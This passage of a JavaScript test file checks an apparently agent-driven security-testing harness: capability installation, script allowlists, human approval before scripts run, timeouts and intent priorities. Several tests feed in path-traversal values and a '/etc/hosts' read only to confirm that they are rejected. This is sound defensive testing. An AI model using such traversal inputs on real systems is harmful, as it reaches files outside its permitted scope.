  const intent = await h.run("src_add_intent", { title: "Actively working", detail: "child alive and reporting", goalId: goal.id }, parent);
  await h.run("src_submit", { intentId: intent.id, facts: [{ kind: "http", target: "https://example.test", detail: "probe now", confidence: "90%" }], assets: [], findings: [], stage: "progress", summary: "just now" }, child);
  const state = await h.run("src_state", {}, parent);
  assert.equal(state.intents[0].status, "running", "progress submit must put intent into running");
  assert.equal((state.orphanIntents ?? []).length, 0, "fresh progress checkpoint must not be flagged as orphan");
});

test("src_state orphanIntents renders actionable guidance", async () => {
  const h = harness();
  const parent = h.exec("parent");
  const child = h.exec("child", "parent");
  const goal = await h.run("src_add_goal", { target: "https://example.test", objective: "render check", authorization: "ticket-42" }, parent);
  const intent = await h.run("src_add_intent", { title: "Stale", detail: "d", goalId: goal.id }, parent);
  const stale = Date.now() - 45 * 60 * 1000;
  const unfreeze = freezeClock(stale);
  try {
    await h.run("src_submit", { intentId: intent.id, facts: [{ kind: "http", target: "https://example.test", detail: "probe stale", confidence: "90%" }], assets: [], findings: [], stage: "progress", summary: "s" }, child);
  } finally { unfreeze(); }
  const tool = h.tools.get("src_state");
  const rendered = tool.output.render({}, await h.run("src_state", {}, parent));
  const text = rendered.map((r) => r.text).join("");
  assert.match(text, /Orphan running intents/);
  assert.match(text, /src_recover_child/);
});

/* ═══════════════ [local.41] caps-sync v2（skill 型）+ src_read/run_capability ═══════════════
   caps-sync 用真实子进程跑（git file:// clone 到 temp DSH_HOME）；插件工具用 harness 直连 +
   process.env.DSH_HOME 指向 temp（工具在 execute 时才读 env，try/finally 恢复）。
   脚本执行测试全部本地 echo/touch，不触网。 */

/* 构造带能力索引的临时 DSH_HOME：apkx（skill，含 run.sh/slow.sh/noop.sh）+ jshook（mcp）。 */
async function makeCapsEnv(prefix) {
  const tmp = await fsPromises.mkdtemp(nodePath.join(nodeOs.tmpdir(), prefix));
  const capDir = nodePath.join(tmp, "capabilities", "apkx");
  await fsPromises.mkdir(nodePath.join(capDir, "scripts"), { recursive: true });
  await fsPromises.writeFile(nodePath.join(capDir, "SKILL.md"), "# apkx\n用法：跑 scripts/run.sh <arg>，提取端点\n");
  await fsPromises.writeFile(nodePath.join(capDir, "scripts", "run.sh"), "#!/usr/bin/env bash\necho \"ran:$1\"\ntouch \"$PWD/ran.flag\"\n");
  await fsPromises.writeFile(nodePath.join(capDir, "scripts", "slow.sh"), "#!/usr/bin/env bash\nsleep 5\necho done-slow\n");
  await fsPromises.writeFile(nodePath.join(capDir, "scripts", "noop.sh"), "#!/usr/bin/env bash\ntouch \"$PWD/noop.flag\"\n");
  await fsPromises.mkdir(nodePath.join(tmp, "capabilities"), { recursive: true });
  await fsPromises.writeFile(nodePath.join(tmp, "capabilities", "index.json"), JSON.stringify({ generatedAt: "test", capabilities: [
    { id: "apkx", kind: "skill", from: "git:file:///tmp/apkx", enabled: true, when: "APK 逆向", docs: "SKILL.md", scripts: ["scripts/run.sh", "scripts/slow.sh", "scripts/noop.sh"], env: null, status: "installed", dir: capDir },
    { id: "jshook", kind: "mcp", from: "npm:@x/y@latest", enabled: true, when: "JS hook", docs: null, scripts: [], env: null, status: "installed" }
  ] }, null, 2));
  return {
    tmp, capDir,
    restore() { return fsPromises.rm(tmp, { recursive: true, force: true }); }
  };
}
/* 工具在 execute 时才读 DSH_HOME —— 测试内设置并在 finally 恢复。 */
function setDshHome(tmp) {
  const prev = process.env.DSH_HOME;
  process.env.DSH_HOME = tmp;
  return () => { if (prev === undefined) delete process.env.DSH_HOME; else process.env.DSH_HOME = prev; };
}
const fileExists = (p) => existsSync(p);

test("[local.41] caps-sync v2: skill 型安装 + index.json 生成 + patch 只接 mcp 型 + 校验", async () => {
  const tmp = await fsPromises.mkdtemp(nodePath.join(nodeOs.tmpdir(), "caps41-"));
  try {
    /* 两个本地 git 仓库：mini-mcp（mcp 型）与 mini-skill（skill 型） */
    const mkRepo = async (name, files) => {
      const repo = nodePath.join(tmp, name);
      await fsPromises.mkdir(repo, { recursive: true });
      for (const [rel, content] of Object.entries(files)) {
        const abs = nodePath.join(repo, rel);
        await fsPromises.mkdir(nodePath.dirname(abs), { recursive: true });
        await fsPromises.writeFile(abs, content);
      }
      const git = (args) => spawnSync("git", ["-c", "user.email=t@t.test", "-c", "user.name=t", ...args], { cwd: repo, encoding: "utf8" });
      git(["init", "-b", "main"]);
      git(["add", "."]);
      const cm = git(["commit", "-m", "init"]);
      assert.equal(cm.status, 0, `git commit failed: ${cm.stderr}`);
      return repo;
    };
    const repoMcp = await mkRepo("repo-mcp", { "package.json": JSON.stringify({ name: "mini-mcp", version: "0.0.1", main: "index.js" }, null, 2), "index.js": "process.stdin.resume();\n" });
    const repoSkill = await mkRepo("repo-skill", { "SKILL.md": "# mini skill\n用法：跑 scripts/run.sh\n", "scripts/run.sh": "#!/usr/bin/env bash\necho \"run:$1\"\n", "scripts/evil.sh": "echo evil\n" });
    await fsPromises.writeFile(nodePath.join(tmp, "capabilities.yaml"), `capabilities:\n  - id: minicap\n    from: git:file://${repoMcp}\n    entry: index.js\n    when: 测试 mcp\n  - id: miniskill\n    from: git:file://${repoSkill}\n    kind: skill\n    scripts: [scripts/run.sh]\n    when: 测试 skill\n`);
    await fsPromises.mkdir(nodePath.join(tmp, "profiles", "web"), { recursive: true });
    await fsPromises.writeFile(nodePath.join(tmp, "profiles", "web", "cordis.patch.yml"), "# test patch\n");
    const runSync = (yaml) => spawnSync(process.execPath, ["scripts/caps-sync.mjs", "--yaml", yaml, "--profile-dir", nodePath.join(tmp, "profiles", "web")], { cwd: process.cwd(), encoding: "utf8", env: { ...process.env, DSH_HOME: tmp } });

    const r1 = runSync(nodePath.join(tmp, "capabilities.yaml"));
    assert.equal(r1.status, 0, `caps-sync failed: ${r1.stderr || r1.stdout}`);
    const index = JSON.parse(await fsPromises.readFile(nodePath.join(tmp, "capabilities", "index.json"), "utf8"));
    const mcp = index.capabilities.find((c) => c.id === "minicap");
    const skill = index.capabilities.find((c) => c.id === "miniskill");
    assert.equal(mcp.kind, "mcp");
    assert.equal(mcp.status, "installed");
    assert.equal(skill.kind, "skill");
    assert.equal(skill.status, "installed");
    assert.deepEqual(skill.scripts, ["scripts/run.sh"]);
    assert.equal(skill.dir !== undefined && fileExists(nodePath.join(skill.dir, "SKILL.md")), true, "skill repo cloned and indexed with dir");
    const patch = await fsPromises.readFile(nodePath.join(tmp, "profiles", "web", "cordis.patch.yml"), "utf8");
    assert.match(patch, /id: mcp-minicap\b/);
    assert.doesNotMatch(patch, /miniskill/, "skill 型不得进 MCP 接线区段");
    /* 幂等：重跑仍成功 */
    const r2 = runSync(nodePath.join(tmp, "capabilities.yaml"));
    assert.equal(r2.status, 0, `caps-sync rerun failed: ${r2.stderr || r2.stdout}`);
    /* 非法 kind 报错退出 */
    await fsPromises.writeFile(nodePath.join(tmp, "bad.yaml"), `capabilities:\n  - id: badcap\n    from: git:file://${repoMcp}\n    kind: bogus\n`);
    const r3 = runSync(nodePath.join(tmp, "bad.yaml"));
    assert.notEqual(r3.status, 0, "bogus kind must fail");
    assert.match(r3.stderr, /kind 必须是 mcp 或 skill/);
    /* scripts 越目录路径报错退出 */
    await fsPromises.writeFile(nodePath.join(tmp, "bad2.yaml"), `capabilities:\n  - id: bad2\n    from: git:file://${repoSkill}\n    kind: skill\n    scripts: [../evil.sh]\n`);
    const r4 = runSync(nodePath.join(tmp, "bad2.yaml"));
    assert.notEqual(r4.status, 0, "script path traversal must fail");
    assert.match(r4.stderr, /相对路径/);
  } finally { await fsPromises.rm(tmp, { recursive: true, force: true }); }
});

test("[local.41] src_list_capabilities 读 index.json 并渲染 skill 状态与白名单", async () => {
  const env = await makeCapsEnv("caps41-list-");
  const restore = setDshHome(env.tmp);
  try {
    const h = harness();
    const parent = h.exec("parent");
    const out = await h.run("src_list_capabilities", {}, parent);
    assert.equal(out.items.length, 2);
    const apkx = out.items.find((i) => i.id === "apkx");
    assert.equal(apkx.kind, "skill");
    assert.equal(apkx.status, "installed");
    assert.deepEqual(apkx.scripts, ["scripts/run.sh", "scripts/slow.sh", "scripts/noop.sh"]);
    const tool = h.tools.get("src_list_capabilities");
    const text = tool.output.render({}, out).map((r) => r.text).join("");
    assert.match(text, /✓已安装 \[skill\] apkx/);
    assert.match(text, /白名单脚本:scripts\/run\.sh scripts\/slow\.sh scripts\/noop\.sh/);
    assert.match(text, /○已启用但未接线.*jshook/);
  } finally { restore(); await env.restore(); }
});

test("[local.41] src_run_capability：goal 闸/mcp 拒绝/白名单闸/挂起待审/同参去重", async () => {
  const env = await makeCapsEnv("caps41-run-");
  const restore = setDshHome(env.tmp);
  try {
    const h = harness();
    const parent = h.exec("g41c"); /* 唯一会话 id：domain 开启是跨测试共享的，"parent" 可能带着历史 goal */
    /* 未初始化 goal → 拒绝 */
    await assert.rejects(() => h.run("src_run_capability", { id: "apkx", script: "scripts/run.sh" }, parent), /requires an initialized SRC goal/);
    await h.run("src_add_goal", { target: "https://example.test", objective: "capability run check", authorization: "ticket-42" }, parent);
    /* mcp 型能力拒绝走 run */
    await assert.rejects(() => h.run("src_run_capability", { id: "jshook", script: "x.sh" }, parent), /mcp 型/);
    /* 非白名单脚本拒绝 */
    await assert.rejects(() => h.run("src_run_capability", { id: "apkx", script: "scripts/evil.sh" }, parent), /白名单/);
    /* 越目录路径在白名单闸即拒（不在清单） */
    await assert.rejects(() => h.run("src_run_capability", { id: "apkx", script: "../outside.sh" }, parent), /白名单/);
    /* timeoutMs 越界拒绝 */
    await assert.rejects(() => h.run("src_run_capability", { id: "apkx", script: "scripts/run.sh", timeoutMs: 999999 }, parent), /timeoutMs/);
    /* 正常挂起：返回 pendingApprovalId 且脚本未执行 */
    const p1 = await h.run("src_run_capability", { id: "apkx", script: "scripts/run.sh", args: ["probe"], justification: "测试执行授权说明" }, parent);
    assert.equal(p1.dedupe, false);
    assert.match(p1.pendingApprovalId, /^approval-/);
    assert.equal(p1.url, "capability://apkx/scripts/run.sh");
    assert.equal(fileExists(nodePath.join(env.capDir, "ran.flag")), false, "script must NOT run before approval");
    /* 同参重复提交复用既有 pending */
    const p2 = await h.run("src_run_capability", { id: "apkx", script: "scripts/run.sh", args: ["probe"] }, parent);
    assert.equal(p2.dedupe, true);
    assert.equal(p2.pendingApprovalId, p1.pendingApprovalId);
    /* pending 落库且 src_state 可见（method=RUN + capability-run 分类 + justification） */
    const state = await h.run("src_state", {}, parent);
    const row = (state.pendingApprovals ?? []).find((r) => r.id === p1.pendingApprovalId);
    assert.ok(row, "RUN pending must be visible in src_state.pendingApprovals");
    assert.equal(row.method, "RUN");
    assert.equal(row.category, "capability-run");
    assert.match(row.justification, /测试执行授权说明/);
  } finally { restore(); await env.restore(); }
});

test("[local.41] src_resolve_approval allow 执行 RUN 脚本返回 runOutput；reject 不执行；超时 SIGKILL", async () => {
  const env = await makeCapsEnv("caps41-resolve-");
  const restore = setDshHome(env.tmp);
  try {
    const h = harness();
    const parent = h.exec("g41d");
    await h.run("src_add_goal", { target: "https://example.test", objective: "capability resolve check", authorization: "ticket-42" }, parent);
    /* allow → 真执行：runOutput 含脚本输出，副作用文件落盘 */
    const p1 = await h.run("src_run_capability", { id: "apkx", script: "scripts/run.sh", args: ["probe"] }, parent);
    const r1 = await h.run("src_resolve_approval", { id: p1.pendingApprovalId, action: "allow", note: "批准" }, parent);
    assert.equal(r1.status, "approved");
    assert.equal(r1.method, "RUN");
    assert.equal(r1.responseStatus, 0);
    assert.match(r1.runOutput, /ran:probe/);
    assert.equal(fileExists(nodePath.join(env.capDir, "ran.flag")), true, "script must execute on allow");
    /* 幂等：已审批不可重复 */
    await assert.rejects(() => h.run("src_resolve_approval", { id: p1.pendingApprovalId, action: "allow" }, parent), /已 approved/);
    /* 超时：slow.sh sleep 5 > timeoutMs 400 → SIGKILL，输出带 [timeout] 标记，不悬挂 */
    const p2 = await h.run("src_run_capability", { id: "apkx", script: "scripts/slow.sh", timeoutMs: 400 }, parent);
    const r2 = await h.run("src_resolve_approval", { id: p2.pendingApprovalId, action: "allow" }, parent);
    assert.match(r2.runOutput, /\[timeout\]/);
    /* reject → 不执行（noop.flag 不存在），runOutput 不出现 */
    const p3 = await h.run("src_run_capability", { id: "apkx", script: "scripts/noop.sh" }, parent);
    const r3 = await h.run("src_resolve_approval", { id: p3.pendingApprovalId, action: "reject", note: "不做" }, parent);
    assert.equal(r3.status, "rejected");
    assert.equal(r3.runOutput, undefined);
    assert.equal(fileExists(nodePath.join(env.capDir, "noop.flag")), false, "script must NOT execute on reject");
    /* 审批事件入投影流（UI 待审面板数据源） */
    const events = h.sessions.get("g41d").events.filter((e) => e.type === "tool/call" && e.data.name === "src_record_pending_approval").map((e) => JSON.parse(e.data.arguments));
    assert.equal(events.length, 3, "each hang-up must emit src_record_pending_approval");
    assert.equal(events[0].method, "RUN");
  } finally { restore(); await env.restore(); }
});

test("[local.41] src_read_capability：docs 探测/指定文件/穿越拒绝/未安装拒绝", async () => {
  const env = await makeCapsEnv("caps41-read-");
  const restore = setDshHome(env.tmp);
  try {
    const h = harness();
    const parent = h.exec("g41e");
    /* 默认探测 docs=SKILL.md */
    const t1 = await h.run("src_read_capability", { id: "apkx" }, parent);
    assert.equal(t1.file, "SKILL.md");
    assert.match(t1.text, /apkx/);
    assert.equal(t1.truncated, false);
    /* 指定能力目录内文件 */
    const t2 = await h.run("src_read_capability", { id: "apkx", file: "scripts/run.sh" }, parent);
    assert.match(t2.text, /ran:\$1/);
    /* 路径穿越拒绝 */
    await assert.rejects(() => h.run("src_read_capability", { id: "apkx", file: "../evil.txt" }, parent), /非法|越出/);
    await assert.rejects(() => h.run("src_read_capability", { id: "apkx", file: "/etc/hosts" }, parent), /非法|越出/);
    /* 未知能力 / mcp 型能力 */
    await assert.rejects(() => h.run("src_read_capability", { id: "nope" }, parent), /不在清单中/);
    await assert.rejects(() => h.run("src_read_capability", { id: "jshook" }, parent), /未安装/);
  } finally { restore(); await env.restore(); }
});

/* ─────────────── [local.42] Decide 重规划：intent 废弃 + 优先级 ─────────────── */

test("[local.42] intent priority：建链带优先级、单独调整、src_state 输出行携带 P 标记", async () => {
  const h = harness();
  const parent = h.exec("g42a");
  await h.run("src_add_goal", { target: "https://example.test", objective: "replan priority", authorization: "SRC" }, parent);
  const i1 = await h.run("src_add_intent", { title: "低优方向", detail: "d", goalId: "goal-1", priority: 3 }, parent);
  const i2 = await h.run("src_add_intent", { title: "高优方向", detail: "d", goalId: "goal-1", priority: 8 }, parent);
  let st = await h.run("src_state", {}, parent);
  const row1 = st.intents.find((r) => r.id === i1.id);
  const row2 = st.intents.find((r) => r.id === i2.id);
  assert.deepEqual({ p1: row1.priority, p2: row2.priority }, { p1: 3, p2: 8 }, "store rows carry priority");
  /* 单独调优先级（不带 status） */
  const upd = await h.run("src_update_intent", { intentId: i1.id, priority: 9 }, parent);
  assert.equal(upd.priority, 9);
  assert.equal(upd.status, "planned", "status untouched when only priority given");
  /* status-only 更新保持向后兼容 */
  const up2 = await h.run("src_update_intent", { intentId: i2.id, status: "running" }, parent);
  assert.equal(up2.status, "running");
  assert.equal(up2.priority, 8, "priority untouched when only status given");
  /* 非法参数 */
  await assert.rejects(() => h.run("src_update_intent", { intentId: i1.id }, parent), /requires status or priority/);
  await assert.rejects(() => h.run("src_update_intent", { intentId: i1.id, priority: 12 }, parent), /1\.\.9/);
  await assert.rejects(() => h.run("src_update_intent", { intentId: i1.id, priority: 2.5 }, parent), /1\.\.9/);
  /* fold 投影：priority 与 deprecated 都进 node */
  const { applySrcEvent } = await import("../lib/src.js");
  const ev = (name, args) => ({ type: "tool/call", data: { name, arguments: JSON.stringify(args) } });
  let state = JSON.parse(JSON.stringify(srcInitialState));
  state = applySrcEvent(state, ev("src_add_goal", { target: "https://t.test", objective: "o", authorization: "a" }));
  state = applySrcEvent(state, ev("src_add_intent", { title: "T", detail: "", goalId: "goal-1", priority: 7 }));
  const node = state.nodes.find((n) => n.kind === "intent");
  assert.equal(node.priority, 7);
  state = applySrcEvent(state, ev("src_update_intent", { intentId: node.id, status: "deprecated" }));
  assert.equal(state.nodes.find((n) => n.kind === "intent").status, "deprecated");
  state = applySrcEvent(state, ev("src_update_intent", { intentId: node.id, priority: 2 }));
  const after = state.nodes.find((n) => n.kind === "intent");
  assert.deepEqual({ status: after.status, priority: after.priority }, { status: "deprecated", priority: 2 });
  /* 非法 priority 被 fold 忽略 */
  state = applySrcEvent(state, ev("src_update_intent", { intentId: node.id, priority: 99 }));
  assert.equal(state.nodes.find((n) => n.kind === "intent").priority, 2);
});

test("[local.42] deprecated：planned 可废弃；completed 拒绝；finalize 不阻塞且出警告", async () => {
  /* [local.65] 机械覆盖待办已拆除。 */
  const h = harness();
  const parent = h.exec("g42b");
  await h.run("src_add_goal", { target: "https://shop.example.test", objective: "deprecate gate", authorization: "SRC" }, parent);
  const dep = await h.run("src_add_intent", { title: "子域爆破方向", detail: "评估后放弃", goalId: "goal-1" }, parent);
  const fin = await h.run("src_update_intent", { intentId: dep.id, status: "deprecated" }, parent);
  assert.equal(fin.status, "deprecated");
  /* finalize：deprecated 不算未完成，无 blocker，出现废弃警告 */
  const done = await h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: [{ dimension: "http-authz-surface", status: "notApplicable" }, { dimension: "cors-headers", status: "notApplicable" }, { dimension: "dom-xhr", status: "notApplicable" }, { dimension: "dict-budget", status: "notApplicable" }, { dimension: "multi-account-cross-authz", status: "notApplicable" }] }, parent);
  assert.equal(done.ready, true, "deprecated intent must not block finalize");
  assert.deepEqual(done.blockers, []);
  assert.match(done.warnings.join(" "), /已主动废弃/);
  /* completed 不能废弃 */
  const ok = await h.run("src_add_intent", { title: "正常方向", detail: "d", goalId: "goal-1" }, parent);
  await h.run("src_update_intent", { intentId: ok.id, status: "completed" }, parent);
  await assert.rejects(() => h.run("src_update_intent", { intentId: ok.id, status: "deprecated" }, parent), /已完成，不能废弃/);
  /* 孤儿巡检不再盯 deprecated（status 已脱离 running） */
  const st = await h.run("src_state", {}, parent);
  assert.equal((st.orphanIntents ?? []).length, 0);
});

/* ─────────────── [local.42] lossless 边界回归：工具输出不得含 undefined 键 ───────────────
 * 真实会话首发（headless 实弹）：src_list_capabilities 对 skill 型条目裸返 wired: undefined、
 * scripts: undefined → lossless-JSON 序列化炸 "value is not lossless JSON"（local.15 同类）。
 * src_state 孤儿巡检的无 checkpoint 分支同样裸返 4 个 undefined 键。测试 harness 不走 lossless
 * 序列化，故用深扫 undefined 键直接镜像该边界。 */
function collectUndefinedKeys(value, path = "$", out = []) {
  if (Array.isArray(value)) {
    value.forEach((v, i) => collectUndefinedKeys(v, `${path}[${i}]`, out));
  } else if (value !== null && typeof value === "object") {
    for (const key of Object.keys(value)) {
      if (value[key] === undefined) out.push(`${path}.${key}`);
      else collectUndefinedKeys(value[key], `${path}.${key}`, out);
    }
  }
  return out;
}

test("[local.42] lossless 边界：src_list_capabilities（skill+mcp 条目）输出零 undefined 键", async () => {
  const env = await makeCapsEnv("caps42-lossless-");
  const restore = setDshHome(env.tmp);
  try {
    const h = harness();
    const parent = h.exec("g42c");
    const out = await h.run("src_list_capabilities", {}, parent);
    const leaks = collectUndefinedKeys(out);
    assert.deepEqual(leaks, [], `undefined 键泄漏: ${leaks.join(", ")}`);
    /* skill 条目不落 wired 键（原来裸返 undefined）；mcp 条目 wired 必须在 */
    const apkx = out.items.find((i) => i.id === "apkx");
    assert.equal("wired" in apkx, false, "skill 条目不得带 wired 键");
    const jshook = out.items.find((i) => i.id === "jshook");
    assert.equal(typeof jshook.wired, "boolean");
  } finally { restore(); await env.restore(); }
});

test("[local.42] lossless 边界：src_state 孤儿巡检（无 checkpoint 分支）输出零 undefined 键", async () => {
  const h = harness();
  const parent = h.exec("g42d");
  await h.run("src_add_goal", { target: "https://orphan.example.test", objective: "lossless orphan", authorization: "SRC" }, parent);
  const it = await h.run("src_add_intent", { title: "孤儿方向", detail: "running 但无 checkpoint", goalId: "goal-1" }, parent);
  await h.run("src_update_intent", { intentId: it.id, status: "running" }, parent);
  const out = await h.run("src_state", {}, parent);
  assert.equal(out.orphanIntents.length, 1);
  assert.match(out.orphanIntents[0].hint, /无任何 checkpoint/);
  const leaks = collectUndefinedKeys(out);
  assert.deepEqual(leaks, [], `undefined 键泄漏: ${leaks.join(", ")}`);
  /* 未设优先级的 intent 也不带 priority 键 */
  assert.equal("priority" in out.intents.find((r) => r.id === it.id), false);
});

/* ═══════════════ [local.48] src_add_capability（一键接入）+ caps-sync 加固 ═══════════════
   纯函数直接 import caps-sync.mjs（main-guard 保证导入不执行主流程）；完整链路经 harness +
   temp DSH_HOME + file:// git 仓库全离线验证。绝不触碰真实 ~/.dsh。 */
import { run as capsRun, serializeCapabilityEntry, appendCapabilityEntry, resolveFrom as capsResolveFrom, deriveCapId } from "../scripts/caps-sync.mjs";

test("[local.48] caps-sync run(): 超时 SIGTERM 返回 code -2/timedOut，正常命令不受影响", async () => {
  const t0 = Date.now();
  const r = await capsRun("bash", ["-c", "sleep 5"], { timeoutMs: 300 });
  assert.equal(r.timedOut, true);
  assert.equal(r.code, -2);
  assert.ok(Date.now() - t0 < 3000, `超时应快速返回而不是等满 5s（实际 ${Date.now() - t0}ms）`);
  const okRun = await capsRun("bash", ["-c", "echo hi"], { timeoutMs: 5000 });
  assert.equal(okRun.code, 0);
  assert.equal(okRun.out, "hi");
  assert.equal(okRun.timedOut, false);
});

test("[local.48] serializeCapabilityEntry/appendCapabilityEntry：序列化、守卫重解析、重复 id、垃圾清单", () => {
  const block = serializeCapabilityEntry({ id: "demo", from: "npm:@s/p@1.2.3", kind: "mcp", when: "演示 场景" });
  assert.match(block, /^  - id: demo\n    from: npm:@s\/p@1\.2\.3\n    kind: mcp\n    when: 演示 场景\n$/);
  const block2 = serializeCapabilityEntry({ id: "sk", from: "git:https://x/y", kind: "skill", docs: "SKILL.md", scripts: ["scripts/a.sh"], enabled: false });
  assert.match(block2, /scripts: \[scripts\/a\.sh\]/);
  assert.match(block2, /enabled: false/);
  /* [local.55] path: 型：合法直通 + 相对路径拒绝 + 短值拒绝 */
  assert.match(serializeCapabilityEntry({ id: "demo", from: "path:/Users/you/dsh-src/skills/clown-src-playbook", kind: "skill", docs: "DSH-ADAPTER.md" }), /from: path:\/Users\/you\/dsh-src\/skills\/clown-src-playbook/);
  assert.throws(() => serializeCapabilityEntry({ id: "ok", from: "path:relative/dir" }), /绝对路径/);
  assert.throws(() => serializeCapabilityEntry({ id: "ok", from: "path:" }), /必须以/);
  /* 非法条目：id 大写、from 前缀错、scripts 越目录、skill 带 entry */
  assert.throws(() => serializeCapabilityEntry({ id: "Bad", from: "npm:x" }));
  assert.throws(() => serializeCapabilityEntry({ id: "ok", from: "https://x" }));
  assert.throws(() => serializeCapabilityEntry({ id: "ok", from: "npm:x", scripts: ["../evil.sh"] }));
  assert.throws(() => serializeCapabilityEntry({ id: "ok", from: "npm:x", kind: "skill", entry: "dist/index.js" }));
  /* 追加 + 守卫重解析：旧条目保留、新条目可解析 */
  const { text, parsed } = appendCapabilityEntry("capabilities:\n  - id: old\n    from: npm:old@1.0.0\n", { id: "newone", from: "npm:new@2.0.0" }, ["old"]);
  assert.equal(parsed.caps.length, 2);
  assert.match(text, /- id: newone/);
  /* 空文件 → 自动生成 capabilities: 头 */
  assert.match(appendCapabilityEntry("", { id: "first", from: "npm:f" }, []).text, /^capabilities:\n  - id: first/);
  /* 重复 id 拦截 */
  assert.throws(() => appendCapabilityEntry(text, { id: "old", from: "npm:o2" }, ["old"]), /重复 id/);
  /* 垃圾清单拦截（守卫式重解析失败不写盘） */
  assert.throws(() => appendCapabilityEntry("garbage\n", { id: "xx", from: "npm:x" }, []), /必须以/);
});

test("[local.48] deriveCapId/resolveFrom：显式直通、离线回退 git、npm 包名、非法输入", async () => {
  assert.equal(deriveCapId("npm:@jshookmcp/jshook@0.3.5"), "jshook");
  assert.equal(deriveCapId("git:https://github.com/vmoranv/jshookmcp"), "jshookmcp");
  assert.equal(deriveCapId("git:https://github.com/x/3repo"), "", "数字开头推导不出合法 id，须显式传");
  const offEnv = { ...process.env, PATH: "/nonexistent" };
  /* [local.55] path: 型推导与解析（目录直装，不走网络） */
  assert.equal(deriveCapId("path:/Users/you/dsh-src/skills/clown-src-playbook"), "clown-src-playbook");
  assert.equal(deriveCapId("path:/Users/you/dsh-src/mcp-servers/fofa_MCP"), "", "下划线推导不出合法 id，须显式传");
  assert.equal((await capsResolveFrom("path:/Users", { env: offEnv, timeoutMs: 2000 })).from, "path:/Users");
  await assert.rejects(() => capsResolveFrom("path:relative/dir", { env: offEnv, timeoutMs: 2000 }), /绝对路径/);
  await assert.rejects(() => capsResolveFrom("path:/nonexistent-xyz-123", { env: offEnv, timeoutMs: 2000 }), /不存在/);
  const r1 = await capsResolveFrom("npm:a/b@1.0", { env: offEnv, timeoutMs: 2000 });
  assert.equal(r1.from, "npm:a/b@1.0");
  const r2 = await capsResolveFrom("https://github.com/o/r", { env: offEnv, timeoutMs: 2000 });
  assert.equal(r2.from, "git:https://github.com/o/r");
  assert.match(r2.resolvedVia, /npm registry 未命中/);
  const r3 = await capsResolveFrom("plainpkg", { env: offEnv, timeoutMs: 2000 });
  assert.equal(r3.from, "npm:plainpkg");
  await assert.rejects(() => capsResolveFrom("ftp://weird", { env: offEnv, timeoutMs: 2000 }));
});

test("[local.48] src_add_capability e2e：skill+mcp 全离线接入、重复 id 重试安全、proxy 持久化、lossless、清单可见", async () => {
  const tmp = await fsPromises.mkdtemp(nodePath.join(nodeOs.tmpdir(), "caps48-"));
  const restore = setDshHome(tmp);
  try {
    /* 本地 git 仓库 ×2：skill 型（文档+脚本）与 mcp 型（node 服务） */
    const mkRepo = async (name, files) => {
      const repo = nodePath.join(tmp, name);
      for (const [rel, content] of Object.entries(files)) {
        const abs = nodePath.join(repo, rel);
        await fsPromises.mkdir(nodePath.dirname(abs), { recursive: true });
        await fsPromises.writeFile(abs, content);
      }
      const git = (args) => spawnSync("git", ["-c", "user.email=t@t.test", "-c", "user.name=t", ...args], { cwd: repo, encoding: "utf8" });
      git(["init", "-b", "main"]);
      git(["add", "."]);
      assert.equal(git(["commit", "-m", "init"]).status, 0, "git commit failed");
      return repo;
    };
    const repoSkill = await mkRepo("repo-skill", { "SKILL.md": "# localcap\n本地测试能力\n", "scripts/hello.sh": "#!/usr/bin/env bash\necho hello-localcap\n" });
    const repoMcp = await mkRepo("repo-mcp", { "package.json": JSON.stringify({ name: "local-mcp", version: "0.0.1", main: "index.js" }), "index.js": "process.stdin.resume();\n" });
    await fsPromises.mkdir(nodePath.join(tmp, "profiles", "web"), { recursive: true });
    await fsPromises.writeFile(nodePath.join(tmp, "profiles", "web", "cordis.patch.yml"), "# test patch\n");

    const h = harness();
    const parent = h.exec("g48a");
    /* ① skill 型接入 */
    const out = await h.run("src_add_capability", { from: `git:file://${repoSkill}`, id: "localcap", kind: "skill", docs: "SKILL.md", scripts: ["scripts/hello.sh"], when: "本地 E2E", proxy: "http://127.0.0.1:7890" }, parent);
    assert.equal(out.registered, true);
    assert.equal(out.from, `git:file://${repoSkill}`);
    assert.equal(out.kind, "skill");
    assert.equal(out.status, "installed");
    assert.equal(out.sync.code, 0);
    assert.equal(out.proxyWritten, "http://127.0.0.1:7890", "空清单+proxy 应能先补 settings 再登记能力");
    assert.equal("wired" in out, false, "skill 结果不得带 wired 键");
    assert.deepEqual(collectUndefinedKeys(out), [], `undefined 泄漏: ${collectUndefinedKeys(out).join(", ")}`);
    assert.equal(fileExists(nodePath.join(out.dir, "scripts", "hello.sh")), true);
    const index = JSON.parse(await fsPromises.readFile(nodePath.join(tmp, "capabilities", "index.json"), "utf8"));
    assert.equal(index.capabilities.find((c) => c.id === "localcap").status, "installed");
    const yaml = await fsPromises.readFile(nodePath.join(tmp, "capabilities.yaml"), "utf8");
    assert.match(yaml, /- id: localcap/);
    assert.match(yaml, /scripts: \[scripts\/hello\.sh\]/);
    /* ② 重复 id 重试：清单不重写、sync 照跑、状态照回（网络失败后重试安全） */
    const out2 = await h.run("src_add_capability", { from: `git:file://${repoSkill}`, id: "localcap", kind: "skill" }, parent);
    assert.equal(out2.registered, false);
    assert.equal(out2.sync.code, 0);
    assert.equal(await fsPromises.readFile(nodePath.join(tmp, "capabilities.yaml"), "utf8"), yaml, "重复 id 不得改写清单");
    /* 相同 id 换来源：仍不覆盖清单，但结果必须明确报告清单中的实际来源。 */
    const differentSource = await h.run("src_add_capability", { from: `git:file://${repoMcp}`, id: "localcap", kind: "skill" }, parent);
    assert.equal(differentSource.registered, false);
    assert.equal(differentSource.existingFrom, `git:file://${repoSkill}`);
    assert.equal(await fsPromises.readFile(nodePath.join(tmp, "capabilities.yaml"), "utf8"), yaml, "不同来源重试也不得改写清单");
    /* ③ mcp 型接入 + proxy 参数持久化 settings.proxy */
    const out3 = await h.run("src_add_capability", { from: `git:file://${repoMcp}`, id: "localmcp", entry: "index.js", when: "本地 mcp", proxy: "http://127.0.0.1:7890" }, parent);
    assert.equal(out3.registered, true);
    assert.equal(out3.status, "installed");
    assert.equal(out3.wired, true, "mcp 型应已接线");
    assert.equal(out3.proxyWritten, "http://127.0.0.1:7890");
    const patch = await fsPromises.readFile(nodePath.join(tmp, "profiles", "web", "cordis.patch.yml"), "utf8");
    assert.match(patch, /id: mcp-localmcp\b/);
    const yaml3 = await fsPromises.readFile(nodePath.join(tmp, "capabilities.yaml"), "utf8");
    assert.match(yaml3, /^settings:\n  proxy: http:\/\/127\.0\.0\.1:7890\n/);
    assert.match(yaml3, /- id: localmcp/);
    assert.deepEqual(collectUndefinedKeys(out3), []);
    /* ④ src_list_capabilities 可见 */
